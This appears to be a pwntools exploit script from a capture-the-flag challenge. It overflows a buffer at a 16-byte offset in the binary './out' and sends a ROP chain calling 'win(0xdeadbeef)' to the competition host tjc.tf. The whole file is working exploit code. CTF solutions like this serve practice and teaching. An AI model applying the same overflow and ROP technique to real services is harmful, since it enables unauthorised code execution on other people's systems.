from pwn import *

elf = ELF("./out")
context.binary = elf
context.log_level = 'debug'

io = elf.process()
io = remote("tjc.tf", 31457)
offset = 16

rop = ROP(elf)
rop.win(0xdeadbeef)

payload = flat({
    offset: rop.chain()
})

io.sendline(payload)
io.interactive()